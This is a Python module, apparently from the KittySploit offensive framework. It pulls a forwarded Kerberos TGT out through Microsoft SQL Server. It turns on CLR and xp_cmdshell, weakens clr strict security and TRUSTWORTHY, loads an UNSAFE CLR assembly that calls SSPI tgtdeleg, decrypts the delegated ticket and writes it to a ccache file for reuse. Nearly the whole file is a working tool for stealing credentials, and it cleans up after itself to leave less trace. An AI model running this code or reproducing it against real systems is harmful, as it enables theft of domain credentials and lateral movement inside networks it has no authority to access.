#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Remote TGT extraction via MSSQL SQL CLR + SSPI tgtdeleg (no PowerShell)."""

from __future__ import annotations

import base64
import struct
from pathlib import Path
from typing import Any, List, Optional, Tuple

from kittysploit import *

_FRAMEWORK_ROOT = Path(__file__).resolve().parents[4]
_DEFAULT_ASSEMBLY_HEX = _FRAMEWORK_ROOT / "data" / "mssql" / "tgtdeleg_assembly.hex"
_DEFAULT_ASSEMBLY_DLL = _FRAMEWORK_ROOT / "data" / "mssql" / "TgtDelegCLR.dll"

_ASM_NAME = "TgtDelegAsm"
_PROC_NAME = "dbo.TgtDelegRun"

_CLR_ERROR_HINTS = {
    "ACH": "AcquireCredentialsHandle failed — host may not be domain-joined",
    "ISC": "InitializeSecurityContext failed — bad SPN, NOT_DELEGATED, or Protected Users",
    "LSA": "LsaConnectUntrusted failed",
    "LAP": "Kerberos auth package not found",
    "LCAP": "LsaCallAuthenticationPackage failed — ticket not cached for SPN",
    "PS": "Protocol status error — service ticket not cached",
    "EX": "Unhandled exception in CLR assembly",
}


class Module(Auxiliary):
    __info__ = {
        "name": "MSSQL TGT Delegation via SQL CLR",
        "description": (
            "Extracts a forwarded Kerberos TGT through MSSQL by loading a CLR assembly "
            "into sqlservr.exe and invoking SSPI tgtdeleg against a target SPN. Avoids "
            "spawning cmd.exe or powershell.exe; restores CLR settings after execution."
        ),
        "author": ["KittySploit Team"],
        "tags": [
            "mssql",
            "kerberos",
            "tgt",
            "delegation",
            "clr",
            "credentials",
            "windows",
            "auxiliary",
        ],
        "references": [],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "host_modification", "data_exfiltration"],
            "expected_requests": 12,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 2.5,
            "noise": 0.6,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["mssql", "sqlserver"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "credentials", "from_detail": "kerberos_tgt"},
                ],
                "suggested_followups": [],
            },
        },
    }

    target = OptString("", "MSSQL host", True)
    port = OptPort(1433, "MSSQL port", True)
    username = OptString("sa", "SQL / Windows username", True)
    password = OptString("", "Password", True)
    database = OptString("master", "Database used for CLR deployment", False)
    windows_auth = OptBool(False, "Use Windows authentication", False)
    spn = OptString("", "Target SPN (e.g. HOST/dc01.corp.local)", False)
    auto_spn = OptBool(False, "Auto-discover a domain controller SPN", False)
    output = OptString("forwarded.ccache", "Output ccache path", False)
    assembly_path = OptString(
        "",
        "Path to tgtdeleg_assembly.hex or TgtDelegCLR.dll (defaults to data/mssql/)",
        False,
        advanced=True,
    )
    keep_artifacts = OptBool(
        False,
        "Do not drop CLR assembly/procedure or restore SQL settings",
        False,
        advanced=True,
    )

    def _opt(self, option, default=""):
        if hasattr(option, "value"):
            return str(option.value or default).strip()
        return str(option or default).strip()

    @staticmethod
    def _load_assembly_hex(path: str = "") -> str:
        candidate = Path(path.strip()) if path.strip() else None
        paths: List[Path] = []
        if candidate:
            paths.append(candidate)
        paths.extend([_DEFAULT_ASSEMBLY_HEX, _DEFAULT_ASSEMBLY_DLL])

        for item in paths:
            if not item.exists():
                continue
            if item.suffix.lower() == ".dll":
                return "0x" + item.read_bytes().hex()
            raw = item.read_text(encoding="utf-8", errors="ignore").strip()
            if not raw:
                continue
            return raw if raw.lower().startswith("0x") else f"0x{raw}"

        raise FileNotFoundError(
            "TgtDelegCLR assembly not found. Place tgtdeleg_assembly.hex (0x...) or "
            f"TgtDelegCLR.dll under {_DEFAULT_ASSEMBLY_HEX.parent}"
        )

    @staticmethod
    def _asn1_len(data: bytes, offset: int = 0) -> Tuple[int, int]:
        first = data[offset]
        if first < 0x80:
            return first, 1
        count = first & 0x7F
        return int.from_bytes(data[offset + 1 : offset + 1 + count], "big"), 1 + count

    @classmethod
    def _gss_to_apreq(cls, token: bytes) -> bytes:
        idx = 0
        if token[idx] != 0x60:
            if (token[idx] & 0x1F) == 14:
                return token
            raise ValueError(f"Unexpected token start: 0x{token[idx]:02x}")

        idx += 1
        _, length_size = cls._asn1_len(token, idx)
        idx += length_size

        if token[idx] != 0x06:
            raise ValueError(f"Expected OID at offset {idx}")
        oid_len = token[idx + 1]
        oid_value = token[idx + 2 : idx + 2 + oid_len]
        idx += 2 + oid_len

        krb5_oid = bytes([0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01, 0x02, 0x02])
        if oid_value == krb5_oid:
            if token[idx : idx + 2] == b"\x01\x00":
                idx += 2
            return token[idx:]

        if token[idx] == 0xA0:
            idx += 1
            _, length_size = cls._asn1_len(token, idx)
            idx += length_size

        if token[idx] != 0x30:
            raise ValueError(f"Expected SEQUENCE at {idx}, got 0x{token[idx]:02x}")
        idx += 1
        seq_len, length_size = cls._asn1_len(token, idx)
        idx += length_size
        seq_end = idx + seq_len

        mech_token = None
        while idx < seq_end:
            field_tag = token[idx]
            idx += 1
            field_len, length_size = cls._asn1_len(token, idx)
            idx += length_size
            if field_tag == 0xA2:
                inner = token[idx : idx + field_len]
                if inner and inner[0] == 0x04:
                    inner_offset = 1
                    value_len, value_size = cls._asn1_len(inner, inner_offset)
                    inner_offset += value_size
                    mech_token = inner[inner_offset : inner_offset + value_len]
                else:
                    mech_token = inner
            idx += field_len

        if mech_token is None:
            raise ValueError("mechToken not found in SPNEGO token")

        if mech_token[0] == 0x06:
            offset = 2 + mech_token[1]
            if mech_token[offset : offset + 2] == b"\x01\x00":
                offset += 2
            return mech_token[offset:]
        return mech_token

    @classmethod
    def _extract_tgt_from_token(
        cls,
        spnego_token: bytes,
        svc_key_bytes: bytes,
        svc_etype: int,
    ) -> bytes:
        from impacket.krb5.asn1 import AP_REQ, Authenticator, EncKrbCredPart, KRB_CRED
        from impacket.krb5.crypto import Key, _enctype_table
        from pyasn1.codec.der import decoder as der_decoder, encoder as der_encoder

        apreq_bytes = cls._gss_to_apreq(spnego_token)
        apreq, _ = der_decoder.decode(apreq_bytes, asn1Spec=AP_REQ())

        svc_key = Key(svc_etype, svc_key_bytes)
        cipher = _enctype_table[svc_etype]
        auth_plain = cipher.decrypt(svc_key, 11, bytes(apreq["authenticator"]["cipher"]))
        authenticator, _ = der_decoder.decode(auth_plain, asn1Spec=Authenticator())

        cksum = authenticator["cksum"]
        if int(cksum["cksumtype"]) != 0x8003:
            raise ValueError(f"Bad checksum type: {int(cksum['cksumtype']):#x}")

        checksum = bytes(cksum["checksum"])
        flags = struct.unpack_from("<I", checksum, 20)[0]
        if not (flags & 1):
            raise ValueError(
                "Delegation flag not set — account may be NOT_DELEGATED or in Protected Users"
            )

        offset = 26
        dlg_len = struct.unpack_from("<H", checksum, offset)[0]
        offset += 2
        krb_cred_raw = checksum[offset : offset + dlg_len]

        krb_cred, _ = der_decoder.decode(krb_cred_raw, asn1Spec=KRB_CRED())
        cred_etype = int(krb_cred["enc-part"]["etype"])
        cred_cipher = bytes(krb_cred["enc-part"]["cipher"])

        candidates: List[Tuple[int, bytes]] = []
        if authenticator["subkey"].hasValue() and authenticator["subkey"]["keyvalue"].hasValue():
            candidates.append(
                (
                    int(authenticator["subkey"]["keytype"]),
                    bytes(authenticator["subkey"]["keyvalue"]),
                )
            )
        candidates.append((svc_etype, svc_key_bytes))

        cred_plain = None
        for key_etype, key_bytes in candidates:
            key = Key(key_etype, key_bytes)
            enc = _enctype_table[key_etype]
            for usage in (14, 22, 26):
                try:
                    cred_plain = enc.decrypt(key, usage, cred_cipher)
                    break
                except Exception:
                    continue
            if cred_plain is not None:
                break

        if cred_plain is None:
            raise ValueError(f"Could not decrypt KRB-CRED enc-part (etype {cred_etype})")

        enc_cred_part, _ = der_decoder.decode(cred_plain, asn1Spec=EncKrbCredPart())
        if len(enc_cred_part["ticket-info"]) == 0:
            raise ValueError("No ticket-info in EncKrbCredPart")

        krb_cred["enc-part"]["etype"] = 0
        krb_cred["enc-part"]["cipher"] = cred_plain
        return der_encoder.encode(krb_cred)

    @staticmethod
    def _parse_clr_output(combined: str) -> Tuple[bytes, bytes, int]:
        text = (combined or "").strip()
        if text.startswith("E:"):
            code = text.split(":", 2)[1] if text.count(":") >= 2 else text[2:5]
            hint = _CLR_ERROR_HINTS.get(code, "unknown error")
            raise RuntimeError(f"CLR payload error ({code}): {text} — {hint}")

        parts = text.split("|")
        if len(parts) != 3:
            raise ValueError(f"Unexpected CLR output format: {text[:300]}")

        return base64.b64decode(parts[0]), base64.b64decode(parts[1]), int(parts[2])

    @staticmethod
    def _save_ccache(clear_krb_cred: bytes, output_path: str) -> dict:
        from impacket.krb5.ccache import CCache

        ccache = CCache()
        ccache.fromKRBCRED(clear_krb_cred)
        ccache.saveFile(output_path)

        def _s(value) -> str:
            return value.decode() if isinstance(value, bytes) else str(value)

        client = "/".join(_s(item["data"]) for item in ccache.principal.components)
        realm = _s(ccache.principal.realm["data"])
        cred = ccache.credentials[0]
        server = "/".join(_s(item["data"]) for item in cred["server"].components)
        return {
            "client": client,
            "realm": realm,
            "server": server,
            "keytype": cred["key"]["keytype"],
            "output": output_path,
        }

    @staticmethod
    def _row_values(rows: Any) -> List[str]:
        values: List[str] = []
        if not rows:
            return values
        for row in rows:
            if isinstance(row, dict):
                for value in row.values():
                    if value is not None:
                        values.append(str(value))
            elif isinstance(row, (list, tuple)):
                for value in row:
                    if value is not None:
                        values.append(str(value))
            elif row is not None:
                values.append(str(row))
        return values

    def _sql_exec(self, connection, query: str, fetch_rows: bool = False):
        cursor = connection.cursor()
        try:
            cursor.execute(query)
            if fetch_rows:
                return self._row_values(cursor.fetchall())
            connection.commit()
            return None
        finally:
            try:
                cursor.close()
            except Exception:
                pass

    def _sql_exec_quiet(self, connection, query: str) -> None:
        try:
            self._sql_exec(connection, query, fetch_rows=False)
        except Exception:
            pass

    def _fetch_config(self, connection, name: str) -> Optional[str]:
        safe_name = name.replace("'", "''")
        rows = self._sql_exec(
            connection,
            "SELECT CAST(value_in_use AS NVARCHAR(32)) AS value "
            f"FROM sys.configurations WHERE name = '{safe_name}'",
            fetch_rows=True,
        )
        return rows[0].strip() if rows else None

    def _auto_discover_spn(self, connection) -> str:
        domain_rows = self._sql_exec(connection, "SELECT DEFAULT_DOMAIN()", fetch_rows=True)
        domain = domain_rows[0].strip() if domain_rows else ""
        if not domain:
            raise RuntimeError("Cannot auto-discover SPN — DEFAULT_DOMAIN() empty")

        self._sql_exec_quiet(
            connection,
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; "
            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
        )
        safe_domain = domain.replace("'", "''")
        rows = self._sql_exec(
            connection,
            f"EXEC xp_cmdshell 'nltest /dclist:{safe_domain} 2>nul'",
            fetch_rows=True,
        )
        self._sql_exec_quiet(connection, "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;")

        for line in rows:
            cleaned = line.strip()
            if "." in cleaned and "command" not in cleaned.lower():
                fqdn = cleaned.split()[0].strip("\\").strip()
                if "." in fqdn:
                    return f"HOST/{fqdn}"
        raise RuntimeError("Cannot auto-discover SPN — use spn option")

    def _deploy_and_run(
        self,
        connection,
        spn: str,
        assembly_hex: str,
        *,
        keep_artifacts: bool = False,
    ) -> str:
        clr_was_enabled = self._fetch_config(connection, "clr enabled") == "1"
        strict_was = self._fetch_config(connection, "clr strict security")
        trustworthy_rows = self._sql_exec(
            connection,
            "SELECT CAST(is_trustworthy_on AS NVARCHAR(8)) FROM sys.databases WHERE name = DB_NAME()",
            fetch_rows=True,
        )
        trustworthy_was = bool(trustworthy_rows and trustworthy_rows[0].strip() == "1")

        try:
            if not clr_was_enabled:
                self._sql_exec_quiet(
                    connection,
                    "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; "
                    "EXEC sp_configure 'clr enabled', 1; RECONFIGURE;",
                )
            if strict_was and strict_was != "0":
                self._sql_exec_quiet(
                    connection,
                    "EXEC sp_configure 'clr strict security', 0; RECONFIGURE;",
                )
            if not trustworthy_was:
                self._sql_exec_quiet(connection, "ALTER DATABASE [master] SET TRUSTWORTHY ON;")

            self._sql_exec_quiet(
                connection,
                f"IF OBJECT_ID('{_PROC_NAME}') IS NOT NULL DROP PROCEDURE {_PROC_NAME};"
                f"IF EXISTS (SELECT 1 FROM sys.assemblies WHERE name='{_ASM_NAME}') "
                f"DROP ASSEMBLY [{_ASM_NAME}];",
            )
            self._sql_exec_quiet(
                connection,
                f"CREATE ASSEMBLY [{_ASM_NAME}] FROM {assembly_hex} WITH PERMISSION_SET = UNSAFE;",
            )
            self._sql_exec_quiet(
                connection,
                f"CREATE PROCEDURE {_PROC_NAME} @spn NVARCHAR(500) "
                f"AS EXTERNAL NAME [{_ASM_NAME}].[TgtDelegCLR].[Run];",
            )

            safe_spn = spn.replace("'", "''")
            rows = self._sql_exec(
                connection,
                f"EXEC {_PROC_NAME} @spn = N'{safe_spn}';",
                fetch_rows=True,
            )
            return "".join(value.strip() for value in rows if value.strip())
        finally:
            if not keep_artifacts:
                self._sql_exec_quiet(
                    connection,
                    f"IF OBJECT_ID('{_PROC_NAME}') IS NOT NULL DROP PROCEDURE {_PROC_NAME};"
                    f"IF EXISTS (SELECT 1 FROM sys.assemblies WHERE name='{_ASM_NAME}') "
                    f"DROP ASSEMBLY [{_ASM_NAME}];",
                )
                if not trustworthy_was:
                    self._sql_exec_quiet(connection, "ALTER DATABASE [master] SET TRUSTWORTHY OFF;")
                if strict_was and strict_was != "0":
                    self._sql_exec_quiet(
                        connection,
                        f"EXEC sp_configure 'clr strict security', {strict_was}; RECONFIGURE;",
                    )
                if not clr_was_enabled:
                    self._sql_exec_quiet(
                        connection,
                        "EXEC sp_configure 'clr enabled', 0; RECONFIGURE;",
                    )

    def _connect(self):
        try:
            import pymssql
        except ImportError as exc:
            raise RuntimeError("pymssql is required for this module") from exc

        host = self._opt(self.target)
        user = self._opt(self.username)
        password = self._opt(self.password)
        if not host or not user:
            raise RuntimeError("target and username are required")

        return pymssql.connect(
            server=host,
            port=int(self.port or 1433),
            user=user,
            password=password,
            database=self._opt(self.database, "master"),
            login_timeout=15,
        )

    def run(self):
        connection = None
        try:
            try:
                from impacket.krb5.ccache import CCache  # noqa: F401
            except ImportError:
                print_error("impacket is required for Kerberos parsing (pip install impacket)")
                return False

            spn = self._opt(self.spn)
            if not spn and not bool(self.auto_spn):
                print_error("Specify spn or enable auto_spn")
                return False

            try:
                assembly_hex = self._load_assembly_hex(self._opt(self.assembly_path))
            except FileNotFoundError as exc:
                print_error(str(exc))
                print_info(
                    "Place tgtdeleg_assembly.hex (0x...) or TgtDelegCLR.dll under data/mssql/"
                )
                return False

            print_status(f"Connecting to {self._opt(self.target)}:{int(self.port or 1433)}")
            connection = self._connect()
            print_success(f"Authenticated as {self._opt(self.username)}")

            if not spn:
                print_status("Auto-discovering domain controller SPN")
                spn = self._auto_discover_spn(connection)
            print_info(f"Target SPN: {spn}")

            print_status("Deploying CLR assembly inside sqlservr.exe")
            combined = self._deploy_and_run(
                connection,
                spn,
                assembly_hex,
                keep_artifacts=bool(self.keep_artifacts),
            )

            spnego_token, svc_session_key, svc_etype = self._parse_clr_output(combined)
            print_success(
                f"Received SPNEGO token ({len(spnego_token)} bytes, svc etype {svc_etype})"
            )

            print_status("Parsing AP-REQ and extracting forwarded TGT")
            clear_krb_cred = self._extract_tgt_from_token(
                spnego_token,
                svc_session_key,
                svc_etype,
            )
            summary = self._save_ccache(clear_krb_cred, self._opt(self.output, "forwarded.ccache"))

            print_success("Forwarded TGT extracted")
            print_info(f"Client  : {summary['client']}@{summary['realm']}")
            print_info(f"Service : {summary['server']}@{summary['realm']}")
            print_info(f"Key etype: {summary['keytype']}")
            print_info(f"Saved   : {summary['output']}")
            print_info(f"Usage   : export KRB5CCNAME={summary['output']}")
            return True
        except RuntimeError as exc:
            print_error(str(exc))
            return False
        except Exception as exc:
            print_error(f"TGT delegation failed: {exc}")
            return False
        finally:
            if connection:
                try:
                    connection.close()
                except Exception:
                    pass
